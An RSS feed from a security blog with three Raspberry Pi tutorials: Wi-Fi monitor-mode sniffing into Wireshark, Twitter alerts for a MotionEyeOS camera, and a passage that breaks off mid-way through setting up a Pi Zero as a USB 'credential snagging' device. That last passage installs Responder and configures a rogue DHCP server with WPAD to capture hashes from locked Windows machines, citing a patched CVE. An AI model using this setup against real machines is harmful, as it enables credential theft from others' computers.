<?xml version="1.0" encoding="utf-8" standalone="yes" ?>
<rss version="2.0" xmlns:atom="http://www.w3.org/2005/Atom">
  <channel>
    <title>Raspberry Pi on Zone13.io</title>
    <link>https://zone13.io/tags/raspberry-pi/</link>
    <description>Recent content in Raspberry Pi on Zone13.io</description>
    <generator>Hugo -- gohugo.io</generator>
    <language>en-US</language>
    <copyright>All rights reserved - 2017</copyright>
    <lastBuildDate>Sun, 08 Oct 2017 11:15:12 +0100</lastBuildDate>
    <atom:link href="https://zone13.io/tags/raspberry-pi/index.xml" rel="self" type="application/rss+xml" />
    
    <item>
      <title>Wi-Fi packet sniffing / monitoring on Windows using Raspberry Pi - inspired by Wimonitor</title>
      <link>https://zone13.io/post/wifi-monitoring-using-raspberry-pi/</link>
      <pubDate>Sun, 08 Oct 2017 11:15:12 +0100</pubDate>
      
      <guid>https://zone13.io/post/wifi-monitoring-using-raspberry-pi/</guid>
      <description>

&lt;p&gt;&lt;a href=&#34;https://www.hackerarsenal.com/products/wimonitor&#34;&gt;Wimonitor&lt;/a&gt; is a wonderful product from Hacker Arsenal that saves pentesters the hassle of having to configure VMs, carry compatible wireless cards that support monitor mode etc. and comes with a web interface to do the configurations. It gives you the flexibility to plug in the device into the Ethernet port and start Wi-Fi monitoring on any OS. Basically it is a &lt;a href=&#34;http://www.tp-link.com/il/products/details/cat-14_TL-MR3020.html&#34;&gt;tp-link TL-MR3020&lt;/a&gt; router with a custom firmware that does all the monitoring part and sends the packets to the host laptop (or Mac !) where you can start Wireshark and concentrate on the packet analysis.&lt;/p&gt;

&lt;p&gt;I haven&amp;rsquo;t got one yet, but have been hearing good reviews about the product since launch. The shipping cost to EU is a bummer :(. Hopefully they will start shipping from EU soon.&lt;/p&gt;

&lt;p&gt;&lt;em&gt;Meanwhile - why not try this on a Raspberry Pi ?&lt;/em&gt;&lt;/p&gt;

&lt;p&gt;The Pi can run a variety of OS including Kali and I have had good success using Pi&amp;rsquo;s during Wi-Fi pentests. The Raspberry Pi 3B is powerful enough to do stable monitoring and with a few simple steps can be converted to a Wimonitor (well, almost !).&lt;/p&gt;

&lt;p&gt;The awesome folks at Hacker Arsenal have done a brilliant job in building Wimonitor. It is a stable plug n play device with firmware support expected. So if you are a beginner to Wi-Fi security or need a trouble free monitoring tool, I would recommend going with Wimonitor.&lt;/p&gt;

&lt;h4 id=&#34;required-hardware&#34;&gt;&lt;strong&gt;Required hardware&lt;/strong&gt;&lt;/h4&gt;

&lt;ul&gt;
&lt;li&gt;Host laptop running Windows(tests and screenshots done on Windows 8.1)&lt;/li&gt;
&lt;li&gt;Raspberry Pi 3B, micro SD card, power adapter (USB 3.0 power should be enough to power the Pi + wireless card)&lt;/li&gt;
&lt;li&gt;Ethernet cable to connect the Pi to host laptop&lt;/li&gt;
&lt;li&gt;Wi-Fi card supporting monitor mode (e.g. TL-WN722N v1)&lt;/li&gt;
&lt;/ul&gt;

&lt;h4 id=&#34;setup&#34;&gt;&lt;strong&gt;Setup&lt;/strong&gt;&lt;/h4&gt;

&lt;ul&gt;
&lt;li&gt;&lt;p&gt;Burn &lt;a href=&#34;https://www.raspberrypi.org/downloads/raspbian/&#34;&gt;RASPBIAN STRETCH LITE&lt;/a&gt; on to the micro SD card. The OS is light weight and comes with out of the box monitor mode support for cards like TL-WN722N. If you are not sure on how to burn the OS, steps can be found &lt;a href=&#34;http://www.raspberry-projects.com/pi/pi-operating-systems/win32diskimager&#34;&gt;here&lt;/a&gt;.&lt;/p&gt;&lt;/li&gt;

&lt;li&gt;&lt;p&gt;Once Raspbian is written to the micro SD card, enable SSH on the Pi. This can be done by creating a blank file named &lt;em&gt;ssh&lt;/em&gt; (note: no file extension) on the micro SD card.&lt;/p&gt;&lt;/li&gt;

&lt;li&gt;&lt;p&gt;In order to make the host laptop communicate with the Pi, the easiest method is to share the host laptop Wi-Fi with the Pi over Ethernet. This will ensure that the Pi gets an IP address in the range 192.168.137.x. To do this, go to network connections (ncpa.cpl), right-click on the Wi-Fi adapter and select Properties. Under the Sharing tab, select the Ethernet adapter to which you will plug in the Pi. Click OK.&lt;/p&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;img src=&#34;https://zone13.io/images/pi-monitor-wifi-properties.png&#34; alt=&#34;pi-monitor-wifi-properties&#34; /&gt;&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;&lt;p&gt;It is now time to connect the Pi to the host laptop. Insert the micro SD card into the Pi&amp;rsquo;s slot, Wi-Fi card into the USB port, connect the Ethernet cable between the host laptop and Pi and power ON.&lt;/p&gt;&lt;/li&gt;

&lt;li&gt;&lt;p&gt;Once the Pi boots up, it should get an IP using the shared connection. The easiest way to discover Pi&amp;rsquo;s IP address is to use &lt;a href=&#34;https://nmap.org/download.html&#34;&gt;nmap&lt;/a&gt; on the host laptop and do a host discovery on 192.168.137.1 /24 subnet.&lt;/p&gt;&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;img src=&#34;https://zone13.io/images/pi-monitor-nmap-scan.png&#34; alt=&#34;pi-monitor-nmap-scan&#34; /&gt;&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;Open &lt;a href=&#34;https://www.chiark.greenend.org.uk/~sgtatham/putty/latest.html&#34;&gt;PuTTY&lt;/a&gt; and ssh into Pi. The default username / password is &lt;strong&gt;pi&lt;/strong&gt; / &lt;strong&gt;raspberry&lt;/strong&gt; for the Raspbian OS we are using.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;img src=&#34;https://zone13.io/images/pi-monitor-putty-login.png&#34; alt=&#34;pi-monitor-putty-login&#34; /&gt;&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;To set a static IP for the Pi, open up &lt;em&gt;/etc/dhcpcd.conf&lt;/em&gt; and add the following lines at the end of the file:&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;code&gt;interface eth0&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;&lt;code&gt;static ip_address=192.168.137.100/24&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;&lt;code&gt;static routers=192.168.137.1&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;&lt;code&gt;static domain_name_servers=192.168.137.1&lt;/code&gt;&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;I prefer to use key based authentication for the SSH login. To do that open PuTTYgen that comes with PuTTYgen and generate a key pair.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;img src=&#34;https://zone13.io/images/pi-monitor-puttygen.png&#34; alt=&#34;pi-monitor-puttygen&#34; /&gt;&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;Create a &lt;strong&gt;.ssh&lt;/strong&gt; folder inside the Pi&amp;rsquo;s home folder. Then create a file named &lt;strong&gt;authorized_keys&lt;/strong&gt; inside the &lt;strong&gt;.ssh&lt;/strong&gt; folder. Paste the public key from PuTTYgen into the &lt;strong&gt;authorized_keys&lt;/strong&gt; file. Save the private key from PuTTYgen. Restart SSH service on the Pi. Also change the user &lt;strong&gt;pi&amp;rsquo;&lt;/strong&gt;s default password on the Pi.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;img src=&#34;https://zone13.io/images/pi-monitor-ssh-setup.png&#34; alt=&#34;pi-monitor-ssh-setup&#34; /&gt;&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;The Raspbian lite OS by default does not ship with the necessary packages to do the monitoring. So to install them, follow the steps below:&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;code&gt;sudo apt update&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;&lt;code&gt;sudo apt install aircrack-ng tcpdump -y&lt;/code&gt;&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;Test that the wireless card is capable of doing monitoring on the Pi.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;img src=&#34;https://zone13.io/images/pi-monitor-test-monitor.png&#34; alt=&#34;pi-monitor-test-monitor&#34; /&gt;&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;Now that we verified that the monitoring is working on the Pi, we can SSH into the Pi, run tcpdump on Pi and feed it to Wireshark running on the host laptop. &lt;a href=&#34;https://www.chiark.greenend.org.uk/~sgtatham/putty/latest.html&#34;&gt;plink.exe&lt;/a&gt; is command line interface to PuTTY.exe that makes all of this possible on Windows. For ease, I have put plink.exe, the SSH private key from PuTTYgen in the same folder. If they are in different folders, change the paths in the below command appropriately.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;The one-liner to do all of this is:&lt;/p&gt;

&lt;p&gt;&lt;code&gt;plink.exe -ssh -i pi-monitor-ssh-key.ppk pi@192.168.137.234 &amp;quot;sudo tcpdump -ni wlan1mon -s 0 -w -&amp;quot; | &amp;quot;C:\Program Files\Wireshark\Wireshark.exe&amp;quot; -k -i -&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;https://zone13.io/images/pi-monitor-start-command.png&#34; alt=&#34;pi-monitor-start-command&#34; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;https://zone13.io/images/pi-monitor-wireshark.png&#34; alt=&#34;pi-monitor-wireshark&#34; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;https://zone13.io/images/pi-monitor-handshake-capture.png&#34; alt=&#34;pi-monitor-handshake-capture&#34; /&gt;&lt;/p&gt;

&lt;p&gt;To monitor only channel 1,&lt;/p&gt;

&lt;p&gt;&lt;code&gt;sudo iwconfig wlan1mon channel 1&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;As you can see, a Raspberry Pi can be used to do Wi-Fi monitoring with minimal effort and pipe the output for viewing using Wireshark on Windows or any OS using the same method.&lt;/p&gt;

&lt;h4 id=&#34;the-minimal-setup-to-get-up-and-running&#34;&gt;&lt;strong&gt;The &amp;ldquo;minimal&amp;rdquo; setup to get up and running&lt;/strong&gt;&lt;/h4&gt;

&lt;p&gt;The above steps are a one time setup. For subsequent monitoring, plug in the Pi with wireless card, power ON the Pi and run the below command to create a monitor mode on the Pi.&lt;/p&gt;

&lt;p&gt;&lt;code&gt;plink.exe -ssh -i pi-monitor-ssh-key.ppk pi@192.168.137.100 &amp;quot;sudo airmon-ng start wlan1&amp;quot;&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;Fire up Wireshark to start the monitoring.&lt;/p&gt;

&lt;p&gt;&lt;code&gt;plink.exe -ssh -i pi-monitor-ssh-key.ppk pi@192.168.137.100 &amp;quot;sudo tcpdump -ni wlan1mon -s 0 -w -&amp;quot; | &amp;quot;C:\Program Files\Wireshark\Wireshark.exe&amp;quot; -k -i -&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;https://zone13.io/images/pi-monitor-setup-1.png&#34; alt=&#34;pi-monitor-setup-1&#34; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;https://zone13.io/images/pi-monitor-setup-2.png&#34; alt=&#34;pi-monitor-setup-2&#34; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;https://zone13.io/images/pi-monitor-setup-3.png&#34; alt=&#34;pi-monitor-setup-3&#34; /&gt;&lt;/p&gt;

&lt;p&gt;That&amp;rsquo;s it. :)&lt;/p&gt;

&lt;h4 id=&#34;summary&#34;&gt;Summary&lt;/h4&gt;

&lt;p&gt;&lt;strong&gt;Pros&lt;/strong&gt;:&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;No need to worry about chunky VMs. Wi-Fi monitoring can be performed on Windows with Wireshark and plink.exe. I haven&amp;rsquo;t tried on Linux / Mac OS yet, but should be able to pipe the SSH output to Wireshark (?).&lt;/li&gt;
&lt;li&gt;Cheap Wi-Fi monitoring. If you are already into pentesting or similar, you should be having a RPi, Wireless card lying around. :)&lt;/li&gt;
&lt;li&gt;Wimonitor is limited to the onboard Wi-Fi chipset (?). Raspberry Pi in this setup has the ability to use any (multiple) wireless card with monitor mode support. Only needs to plug the Pi into a power socket or use a batter pack with more juice than a USB hub to power the cards. How about a Yagi–Uda antenna with RPi&amp;rsquo;s wireless card ?&lt;/li&gt;
&lt;li&gt;Minimal setup required. Raspbian, Kali comes with out-of-the-box support for cards like Alfa AWUS036NHA, TL-WN722N etc. Once the above steps are done, it is just a matter of plugging in the Pi with wireless card, and running the two lines of commands to start packet analysis.&lt;/li&gt;
&lt;li&gt;RPi has enough firepower to do the monitoring comfortably. In a relatively busy Wi-Fi neighborhood, the Pi hardly consumes 35 MB of RAM in total with the above setup.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;&lt;strong&gt;Cons&lt;/strong&gt;:&lt;/p&gt;

&lt;ul&gt;
&lt;li&gt;Not plug n play like Wimonitor. Some initial setup (2 lines at cmd :)) is required to get it up and running.&lt;/li&gt;
&lt;li&gt;No web interface for configuration changes.&lt;/li&gt;
&lt;li&gt;No channel subset hopping capabilities for now.&lt;/li&gt;
&lt;/ul&gt;

&lt;p&gt;Hope you find the post useful.&lt;/p&gt;
</description>
    </item>
    
    <item>
      <title>Twitter notifications for MotionEyeOS video surveillance system on Raspberry Pi</title>
      <link>https://zone13.io/post/Twitter-notifications-for-MotionEyeOS-video-surveillance-system/</link>
      <pubDate>Mon, 27 Mar 2017 21:18:17 +0100</pubDate>
      
      <guid>https://zone13.io/post/Twitter-notifications-for-MotionEyeOS-video-surveillance-system/</guid>
      <description>

&lt;p&gt;&lt;a href=&#34;https://github.com/ccrisan/motioneyeos&#34;&gt;MotionEyeOS&lt;/a&gt; is a wonderful project by Calin Crisan that converts your single board computer into a video surveillance system in a matter of minutes. It is &lt;a href=&#34;https://github.com/ccrisan/motioneyeos/wiki/Supported-Devices&#34;&gt;supported&lt;/a&gt; on a number of devices and is well maintained with good community support.&lt;/p&gt;

&lt;p&gt;Now that the latest &lt;a href=&#34;https://www.raspberrypi.org/products/pi-zero-w/&#34;&gt;Raspberry Pi Zero version (W)&lt;/a&gt; comes with onboard Wi-Fi, it makes an ideal candidate to deploy MotionEyeOS across your perimeter and run a cheap video surveillance system with lesser clutter of having to attach a Wi-Fi dongle as in the previous versions of Pi Zero.&lt;/p&gt;

&lt;h3 id=&#34;motion-notifications&#34;&gt;Motion notifications&lt;/h3&gt;

&lt;p&gt;MotionEyeOS offers push notifications in the form of email alerts and custom scripts upon detection of motion. The community has already chipped in with options like &lt;a href=&#34;https://www.pi-supply.com/make/adding-push-notifications-motioneyeos-formerly-motionpie/&#34;&gt;Pushover and IFTTT&lt;/a&gt;. I was playing around with the software on Raspberry Pi over the last few days and thought that Twitter notifications on mobile would be nice to have. I did some basic search to see if someone already implemented this, however couldn&amp;rsquo;t find any and decided I will code my own.&lt;/p&gt;

&lt;p&gt;Now the &lt;a href=&#34;https://github.com/ccrisan/motioneyeos/releases&#34;&gt;SD card images&lt;/a&gt; supplied by MotionEyeOS are stripped down versions of the Raspbian OS with only the necessary features for performance reasons. To enable Twitter notifications using my method below, you will have to install MotionEyeOS on top of Raspbian (&lt;a href=&#34;https://www.raspberrypi.org/downloads/raspbian/&#34;&gt;lite version&lt;/a&gt; preferred). This is to ensure that the &lt;a href=&#34;https://github.com/bear/python-twitter&#34;&gt;Python Twitter&lt;/a&gt; module can be installed.&lt;/p&gt;

&lt;h3 id=&#34;installation-steps&#34;&gt;Installation steps&lt;/h3&gt;

&lt;p&gt;I assume that you have the latest version of Raspbian Jessie Lite &lt;a href=&#34;https://www.raspberrypi.org/documentation/installation/installing-images/README.md&#34;&gt;written&lt;/a&gt; to the Micro SD card. I have tested the following method on Pi Zero and Pi 3B and works fine. Use &lt;strong&gt;sudo&lt;/strong&gt; where necessary.&lt;/p&gt;

&lt;p&gt;1&amp;gt; Power ON the Pi and open a SSH session.&lt;/p&gt;

&lt;p&gt;2&amp;gt; Use &lt;strong&gt;raspi-config&lt;/strong&gt; to enable the camera module.&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;https://zone13.io/images/raspi-config1.png&#34; alt=&#34;raspi-config&#34; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;https://zone13.io/images/raspi-config2.png&#34; alt=&#34;raspi-config&#34; /&gt;&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;https://zone13.io/images/raspi-config3.png&#34; alt=&#34;raspi-config&#34; /&gt;&lt;/p&gt;

&lt;p&gt;3&amp;gt; Open the &lt;strong&gt;/etc/modules&lt;/strong&gt; file and add &lt;strong&gt;bcm2835-v4l2&lt;/strong&gt; on a new line.&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;https://zone13.io/images/etc_modules_cam.png&#34; alt=&#34;&#34; /&gt;&lt;/p&gt;

&lt;p&gt;4&amp;gt; Follow the steps mentioned &lt;a href=&#34;https://github.com/ccrisan/motioneye/wiki/Install-On-Raspbian&#34;&gt;here&lt;/a&gt; under &amp;lsquo;Instructions&amp;rsquo; to complete the installation of MotionEyeOS on Raspbian.&lt;/p&gt;

&lt;p&gt;5&amp;gt; Create a dummy Twitter account and setup the API keys. &lt;a href=&#34;https://www.slickremix.com/docs/how-to-get-api-keys-and-tokens-for-twitter/&#34;&gt;Here&lt;/a&gt; is a good resource on generating the Twitter API keys to use in the script.&lt;/p&gt;

&lt;p&gt;6&amp;gt; Install &lt;a href=&#34;https://github.com/bear/python-twitter&#34;&gt;Python Twitter&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;&lt;code&gt;pip install python-twitter&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;7&amp;gt; There are a couple of ways of receiving the push notifications on your Twitter account:&lt;/p&gt;

&lt;p&gt;​   a) Setup the dummy Twitter account to post a Tweet every time motion is detected - &lt;a href=&#34;https://gist.github.com/zone13/947e9eea96294a6e070b630378349e70&#34;&gt;script 1&lt;/a&gt;. Configure your Twitter account to follow the dummy account and receive push notifications on your mobile device using the steps &lt;a href=&#34;https://support.twitter.com/articles/20169887&#34;&gt;here&lt;/a&gt;.&lt;/p&gt;

&lt;p&gt;​   b) Script variant that tweets the latest captured image along with the tweet - &lt;a href=&#34;https://gist.github.com/zone13/48a4a918331eda4be50afed6eb5f4f2c&#34;&gt;script 2&lt;/a&gt;.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;IMPORTANT&lt;/strong&gt;: If you are planning to use this, make sure that your tweets are &lt;a href=&#34;https://support.twitter.com/articles/20169886&#34;&gt;protected&lt;/a&gt; so that only you or those accounts that you permit can view your tweets. &lt;img src=&#34;https://zone13.io/images/protected_tweets.png&#34; alt=&#34;Protected tweets&#34; /&gt;&lt;/p&gt;

&lt;p&gt;​   c) Setup the dummy Twitter account to send Direct Messages (DM) to your Twitter account - &lt;a href=&#34;https://gist.github.com/zone13/308d5b39f9f968e21041a53cc9644d22&#34;&gt;script 3&lt;/a&gt;. Enable notifications for DMs on your mobile device.&lt;/p&gt;

&lt;p&gt;Using b) above has the added advantage of adding the latest image captured by MotionEyeOS to the Tweet. DMs do not support attaching an image though.&lt;/p&gt;

&lt;p&gt;8&amp;gt; Once you finalize the script to use, create folder at &lt;strong&gt;/var/lib/motioneye&lt;/strong&gt; and store the python script there. Ensure that the script has execute permissions.&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;https://zone13.io/images/motion_notifications.png&#34; alt=&#34;Motion notifications&#34; /&gt;&lt;/p&gt;

&lt;p&gt;9&amp;gt; Login to the web GUI for MotionEyeOS and configure to run the script under &amp;lsquo;Motion Notifications&amp;rsquo;&lt;/p&gt;

&lt;h3 id=&#34;caveats&#34;&gt;Caveats&lt;/h3&gt;

&lt;ol&gt;
&lt;li&gt;The Twitter API has limits on the number of tweets and direct messages. However during my tests, none of these limits were hit and I have a fully functional surveillance system at home using this method.&lt;/li&gt;
&lt;li&gt;In one of the scripts (2), I have added a method to upload the latest image capture to the motion alert tweet. This method has its own privacy implications which is the same as uploading your data to any other cloud service. Make sure that you know what you are doing. :)&lt;/li&gt;
&lt;li&gt;Do not expose your live feed to internet using port forwarding. In my case, I OpenVPN into my Raspberry instance to view the live feed.&lt;/li&gt;
&lt;li&gt;Needless to say, use strong passwords for SSH and other service that you enable with MotionEyeOS. Do not re-use the passwords. Also remember that MotionEyeOS stores the password in plaintext in config files.&lt;/li&gt;
&lt;/ol&gt;

&lt;p&gt;Hope this post is useful for those who wish to setup Twitter notifications for MotionEyeOS. If you run into problems, please post a comment below and I will try my best to help.&lt;/p&gt;
</description>
    </item>
    
    <item>
      <title>Raspberry Pi Zero for credential snagging</title>
      <link>https://zone13.io/post/Raspberry-Pi-Zero-for-credential-snagging/</link>
      <pubDate>Sun, 18 Sep 2016 12:13:05 +0100</pubDate>
      
      <guid>https://zone13.io/post/Raspberry-Pi-Zero-for-credential-snagging/</guid>
      <description>

&lt;blockquote&gt;
&lt;p&gt;Update: &lt;strong&gt;CVE-2016-3302&lt;/strong&gt; / &lt;strong&gt;MS16-112&lt;/strong&gt; patch was released by Microsoft to fix the issue.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h3 id=&#34;introduction&#34;&gt;Introduction&lt;/h3&gt;

&lt;p&gt;This post is an extension to Rob Fuller&amp;rsquo;s (@mubix) work - &lt;a href=&#34;https://room362.com/post/2016/snagging-creds-from-locked-machines/&#34;&gt;https://room362.com/post/2016/snagging-creds-from-locked-machines/&lt;/a&gt; to see how a Raspberry Pi Zero can be used for credential snagging. All credits go to @mubix for the original research. It is recommended to read mubix&amp;rsquo;s post (if you haven&amp;rsquo;t already !) before proceeding.&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;https://zone13.io/images/pizero.jpeg&#34; alt=&#34;&#34; style=&#34;width:600px&#34; /&gt;&lt;/p&gt;

&lt;h3 id=&#34;prerequisites&#34;&gt;Prerequisites&lt;/h3&gt;

&lt;h4 id=&#34;software&#34;&gt;Software&lt;/h4&gt;

&lt;p&gt;This will &lt;strong&gt;only&lt;/strong&gt; work if the target Windows system has &lt;a href=&#34;https://en.wikipedia.org/wiki/RNDIS&#34;&gt;RNDIS&lt;/a&gt; drivers installed. The driver doesn&amp;rsquo;t seem to install automatically (like when you plug in a new mouse or any USB accessory) and has to be installed manually as explained &lt;a href=&#34;https://github.com/ev3dev/ev3dev/wiki/Setting-Up-Windows-USB-Ethernet-Networking&#34;&gt;here&lt;/a&gt; after booting up the Pi Zero for the first time.&lt;/p&gt;

&lt;h4 id=&#34;hardware&#34;&gt;Hardware&lt;/h4&gt;

&lt;ol&gt;
&lt;li&gt;Raspberry Pi Zero (I have v1.3)&lt;/li&gt;
&lt;li&gt;Micro SD card (4GB or more) with &lt;a href=&#34;https://www.raspberrypi.org/downloads/raspbian/&#34;&gt;Raspbian Jessie&lt;/a&gt; (I used Jessie Lite, Release date: 2016-05-27)&lt;br /&gt;&lt;/li&gt;
&lt;li&gt;Micro USB cable (any cable that supports data transfer - try those coming with mobiles)&lt;/li&gt;
&lt;/ol&gt;

&lt;h3 id=&#34;procedure&#34;&gt;Procedure&lt;/h3&gt;

&lt;p&gt;I&amp;rsquo;m setting up the Pi Zero from my Windows machine (Windows 8.1). If you are working from a different OS, adopt any changes as necessary (Google is your best friend :)).&lt;/p&gt;

&lt;p&gt;I assume that you have already installed the Raspbian Jessie Lite OS on the Micro SD card. On Windows, I prefer to use the &lt;a href=&#34;https://sourceforge.net/projects/win32diskimager/&#34;&gt;Win32DiskImager&lt;/a&gt;. If you are not familiar with the OS flashing process, refer &lt;a href=&#34;https://www.raspberrypi.org/documentation/installation/installing-images/&#34;&gt;here&lt;/a&gt;.&lt;/p&gt;

&lt;h4 id=&#34;pi-zero-usb-gadget-setup&#34;&gt;Pi Zero USB gadget setup&lt;/h4&gt;

&lt;p&gt;Insert the Micro SD card with Raspbian OS into a suitable card reader and plug it into the Windows system. Open the boot partition in Windows explorer.&lt;/p&gt;

&lt;p&gt;Two files need to be edited here:&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;config.txt&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;Append the following on a new line:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;dtoverlay=dwc2
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;The resulting file looks like &lt;a href=&#34;https://github.com/zone13/pi-Zero-USB-Ethernet/blob/master/config.txt&#34;&gt;this&lt;/a&gt;.&lt;/p&gt;

&lt;p&gt;&lt;strong&gt;cmdline.txt&lt;/strong&gt;&lt;/p&gt;

&lt;p&gt;Insert the following after &lt;strong&gt;rootwait&lt;/strong&gt;:&lt;/p&gt;

&lt;pre&gt;&lt;code&gt;modules-load=dwc2,g_ether
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Be careful with the formatting on this one, the values are separated by spaces.&lt;/p&gt;

&lt;p&gt;The resulting file looks like &lt;a href=&#34;https://github.com/zone13/pi-Zero-USB-Ethernet/blob/master/cmdline.txt&#34;&gt;this&lt;/a&gt;.&lt;/p&gt;

&lt;p&gt;Once both the files are edited and saved, eject the Micro SD card and insert into the Pi Zero slot. Connect the Pi Zero to the Windows system using the Micro USB cable.&lt;/p&gt;

&lt;blockquote&gt;
&lt;p&gt;Note: The cable has to be connected to the Micro USB port of Pi Zero to be used as a USB gadget.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;h4 id=&#34;pi-zero-packages-setup&#34;&gt;Pi Zero packages setup&lt;/h4&gt;

&lt;p&gt;If the Pi Zero is not detected by Windows system after booting up, it means that RNDIS drivers are not installed. The drivers can be installed by following the procedure &lt;a href=&#34;https://github.com/ev3dev/ev3dev/wiki/Setting-Up-Windows-USB-Ethernet-Networking&#34;&gt;here&lt;/a&gt;.&lt;/p&gt;

&lt;p&gt;Once the RNDIS devices are installed, the new USB Ethernet will be visible under &lt;strong&gt;Network Connections&lt;/strong&gt;.&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;https://zone13.io/images/net_conns_adapter.png&#34; alt=&#34;net_conns_adapter&#34; /&gt;&lt;/p&gt;

&lt;blockquote&gt;
&lt;p&gt;Note: I have renamed my adapter as &lt;strong&gt;PiZero&lt;/strong&gt; and hence displayed above.&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;There are a number of packages that need to be installed on the Pi Zero to be used a credential snagging device. For this to happen, the Pi Zero will need Internet access.&lt;/p&gt;

&lt;p&gt;I decided to share my LAN Internet with Pi Zero for this purpose. You can do the same or even share your Wi-Fi Internet.&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;https://zone13.io/images/share_internet.png&#34; alt=&#34;share_internet&#34; /&gt;&lt;/p&gt;

&lt;p&gt;At this stage you should be able to ping Pi Zero (hostname: &lt;em&gt;raspberrypi.local&lt;/em&gt;)&lt;/p&gt;

&lt;p&gt;&lt;img src=&#34;https://zone13.io/images/ping_pizero_local.png&#34; alt=&#34;ping_pizero_local&#34; /&gt;&lt;/p&gt;

&lt;p&gt;Now, you can SSH to Pi Zero using the hostname.&lt;/p&gt;

&lt;p&gt;The default credentials are:&lt;/p&gt;

&lt;blockquote&gt;
&lt;p&gt;username: pi&lt;/p&gt;

&lt;p&gt;password: raspberry&lt;/p&gt;
&lt;/blockquote&gt;

&lt;p&gt;&lt;img src=&#34;https://zone13.io/images/putty_settings.png&#34; alt=&#34;putty_settings&#34; /&gt;&lt;/p&gt;

&lt;p&gt;At this point, it is a good idea to check Internet connectivity for the Pi Zero (e.g. try pinging google.com). If the ping can resolve to IP (not getting a ping response is alright), you are good to go. If there is some connectivity error, try running:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-sh&#34;&gt;sudo dhclient usb0
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Now, proceed with running the below commands in order:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-sh&#34;&gt;sudo apt-get update
sudo apt-get install -y python git python-pip python-dev screen sqlite3 isc-dhcp-server python-crypto inotify-tools

sudo mkdir tools
cd tools
sudo git clone https://github.com/lgandx/Responder.git responder
&lt;/code&gt;&lt;/pre&gt;

&lt;h4 id=&#34;configure-a-static-ip&#34;&gt;Configure a static IP&lt;/h4&gt;

&lt;p&gt;Open /etc/network/interfaces&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-sh&#34;&gt;sudo nano /etc/network/interfaces
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Paste the below code at the end of the file:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-sh&#34;&gt;auto usb0
allow-hotplug usb0
iface usb0 inet static
  address 192.168.2.201
  netmask 255.255.255.0
  gateway 192.168.2.1
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;&lt;img src=&#34;https://zone13.io/images/etc_interfaces.png&#34; alt=&#34;etc_interfaces&#34; /&gt;&lt;/p&gt;

&lt;h4 id=&#34;dhcp-server-setup&#34;&gt;DHCP server setup&lt;/h4&gt;

&lt;p&gt;Backup the existing config file and create a new one for our setup&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-sh&#34;&gt;sudo mv /etc/dhcp/dhcpd.conf /etc/dhcp/dhcpd.conf.bkp
sudo nano /etc/dhcp/dhcpd.conf
&lt;/code&gt;&lt;/pre&gt;

&lt;p&gt;Paste the below code:&lt;/p&gt;

&lt;pre&gt;&lt;code class=&#34;language-sh&#34;&gt;ddns-update-style none;

option domain-name &amp;quot;domain.local&amp;quot;;
option domain-name-servers 192.168.2.201;

default-lease-time 60;
max-lease-time 72;

# If this DHCP server is the official DHCP server for the local
# network, the authoritative directive should be uncommented.
authoritative;

# Use this to send dhcp log messages to a different log file (you also
# have to hack syslog.conf to complete the redirection).
log-facility local7;

# wpad
option local-proxy-config code 252 = text;

# A slightly different configuration for an internal subnet.
subnet 192.168.2.0 netmask 255.255.255.0 {
  range 192.168.2.1 192.168.2.2;
  option routers 192.168.2.201;
